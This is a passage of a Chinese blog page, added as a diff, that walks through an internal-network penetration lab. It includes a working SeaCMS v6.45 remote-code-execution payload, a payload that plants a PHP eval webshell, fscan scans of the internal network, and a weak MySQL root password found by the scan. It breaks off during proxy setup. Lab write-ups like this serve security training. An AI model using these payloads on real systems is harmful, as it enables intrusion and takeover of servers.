@@ -1,0 +1,1114 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/colourful.png">
+  <link rel="icon" href="/img/colourful.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Colourful">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="flag1（seacms v6.45rce 前台Getshell） 打开可以看到是一个seacms 利用fscan扫描看看有什么漏洞 1fscan.exe -u http:&#x2F;&#x2F;8.140.236.137:89&#x2F;   看到存在rce漏洞，就上网找poc打  传了之后抓包 poc 1searchtype&#x3D;5&amp;searchword&#x3D;&#123;if&#123;searchpage:year&amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透靶场1">
+<meta property="og:url" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Colourful">
+<meta property="og:description" content="flag1（seacms v6.45rce 前台Getshell） 打开可以看到是一个seacms 利用fscan扫描看看有什么漏洞 1fscan.exe -u http:&#x2F;&#x2F;8.140.236.137:89&#x2F;   看到存在rce漏洞，就上网找poc打  传了之后抓包 poc 1searchtype&#x3D;5&amp;searchword&#x3D;&#123;if&#123;searchpage:year&amp;#1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191539741.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191542226.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191544627.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191547310.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191550155.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191553154.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191555534.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191558804.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191601520.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191604844.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191608221.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191612001.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191614446.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191616898.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191619158.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191623633.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191625726.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191627885.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191630215.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191632585.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191635569.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191638473.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191641273.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191643546.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191646154.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191648691.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191651344.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191654974.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191657274.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191659941.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191703720.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191705995.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191708131.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191714445.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191716574.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191719563.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191722056.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191724426.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191728805.png">
+<meta property="article:published_time" content="2026-03-19T09:36:11.000Z">
+<meta property="article:modified_time" content="2026-03-24T11:17:31.770Z">
+<meta property="article:author" content="Colourful">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191539741.png">
+<meta name="twitter:creator" content="@Colorful">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内网渗透靶场1 - Colourful</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"colourful228.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2026-01-09T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Colorful的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/M.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网渗透靶场1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Colourful
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-19 17:36" pubdate>
+          2026年3月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网渗透靶场1</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-03-24T19:17:31+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="flag1（seacms-v6-45rce-前台Getshell）"><a href="#flag1（seacms-v6-45rce-前台Getshell）" class="headerlink" title="flag1（seacms v6.45rce 前台Getshell）"></a>flag1（seacms v6.45rce 前台Getshell）</h1><p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191539741.png" srcset="/img/loading.gif" lazyload alt="image-20260324191539741"></p>
+<p>打开可以看到是一个seacms</p>
+<p>利用fscan扫描看看有什么漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan.exe -u http://8.140.236.137:89/<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191542226.png" srcset="/img/loading.gif" lazyload alt="image-20260324191542226"></p>
+<p>看到存在rce漏洞，就上网找poc打</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191544627.png" srcset="/img/loading.gif" lazyload alt="image-20260324191544627"></p>
+<p>传了之后抓包</p>
+<p>poc</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">searchtype</span>=5&amp;searchword=&#123;<span class="hljs-keyword">if</span>&#123;searchpage:year&#125;&amp;<span class="hljs-attribute">year</span>=:e&#123;searchpage:area&#125;&#125;&amp;<span class="hljs-attribute">area</span>=v&#123;searchpage:letter&#125;&amp;<span class="hljs-attribute">letter</span>=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=(<span class="hljs-variable">$_P</span>&#123;searchpage:ver&#125;&amp;&amp;<span class="hljs-attribute">ver</span>=OST[9]))&amp;9[]=system(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>可以执行rce</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191547310.png" srcset="/img/loading.gif" lazyload alt="image-20260324191547310"></p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191550155.png" srcset="/img/loading.gif" lazyload alt="image-20260324191550155"></p>
+<p>ok既然能够rce，那就能写入webshell</p>
+<p>poc</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=system(&quot;echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[\<span class="hljs-string">&quot;cmd\&quot;]);?&gt;</span></span><span class="language-xml">&#x27;&gt;m.php&quot;);</span><br></code></pre></td></tr></table></figure>
+
+<p>蚁剑连接成功</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191553154.png" srcset="/img/loading.gif" lazyload alt="image-20260324191553154"></p>
+<p>同样也能看到flag</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191555534.png" srcset="/img/loading.gif" lazyload alt="image-20260324191555534"></p>
+<p>flag4{22ddee0793c18171e62cff7eef6625ac}</p>
+<h1 id="flag2（内网代理-Mysql-UDF提权）"><a href="#flag2（内网代理-Mysql-UDF提权）" class="headerlink" title="flag2（内网代理+Mysql+UDF提权）"></a>flag2（内网代理+Mysql+UDF提权）</h1><p>在蚁剑中开启终端，查看网段信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>内网IP：10.10.20.31</li>
+<li>网段：10.10.20.0&#x2F;24</li>
+</ul>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191558804.png" srcset="/img/loading.gif" lazyload alt="image-20260324191558804"></p>
+<p>在服务器的&#x2F;tmp目录下，上传fscan</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191601520.png" srcset="/img/loading.gif" lazyload alt="image-20260324191601520"></p>
+<p>在&#x2F;tmp目录下打开终端，因为一开始直接执行.&#x2F;fscan会显示无权限，所以要加执行权限命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x ./fscan<br></code></pre></td></tr></table></figure>
+
+<p>扫描内网服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 10.10.20.0/24<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191604844.png" srcset="/img/loading.gif" lazyload alt="image-20260324191604844"></p>
+<p>一开始没看到目录下有生成的结果文件以为是要加写文件的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 10.10.20.0/24 &gt; r.txt 2&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<p>后来才发现是目录没有及时刷新出来</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191608221.png" srcset="/img/loading.gif" lazyload alt="image-20260324191608221"></p>
+<p>查看扫描结果（两个文件的结果肯定是一样的啦</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.20.31:80</span> open<br><span class="hljs-number">10.10.20.88:8080</span> open<br><span class="hljs-number">10.10.20.166:3306</span> open<br><span class="hljs-number">10.10.20.88:8009</span> open<br><span class="hljs-number">10.10.20.1:89</span> open<br><span class="hljs-number">10.10.20.1:8082</span> open<br><span class="hljs-number">10.10.20.1:22</span> open<br><span class="hljs-number">10.10.20.1:10000</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">8</span><br>start vulscan<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8082</span>    code:<span class="hljs-number">401</span> len:<span class="hljs-number">17</span>     title:None<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">1</span>:<span class="hljs-number">10000</span>   code:<span class="hljs-number">200</span> len:<span class="hljs-number">637</span>    title:Welcome to nginx!<br><span class="hljs-string">[+]</span> mysql <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">166</span>:<span class="hljs-number">3306</span>:root <span class="hljs-number">123456</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">1</span>:<span class="hljs-number">89</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">21255</span>  title:海洋CMS<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">31</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">21255</span>  title:海洋CMS<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">88</span>:<span class="hljs-number">8080</span>   code:<span class="hljs-number">200</span> len:<span class="hljs-number">11230</span>  title:Apache Tomcat/<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">43</span><br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">31</span> poc-yaml-seacms-sqli <br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">1</span>:<span class="hljs-number">89</span> poc-yaml-seacms-sqli <br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">1</span>:<span class="hljs-number">89</span> poc-yaml-seacmsv645-command-exec <br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">31</span> poc-yaml-seacmsv645-command-exec <br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">31</span> poc-yaml-seacms-v654-rce <br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">1</span>:<span class="hljs-number">89</span> poc-yaml-seacms-v654-rce<br></code></pre></td></tr></table></figure>
+
+<p>信息收集：</p>
+<ul>
+<li>10.10.20.166:3306：mysql数据库，root的弱口令为123456</li>
+<li>10.10.20.88:8080：Apache Tomcat&#x2F;8.0.43</li>
+</ul>
+<p>搭建内网代理，在自己的云服务上开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin -l 9999<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191612001.png" srcset="/img/loading.gif" lazyload alt="image-20260324191612001"></p>
+<p>将<code>linux_x64_agent</code>上传到<code>/tmp</code>目录下</p>
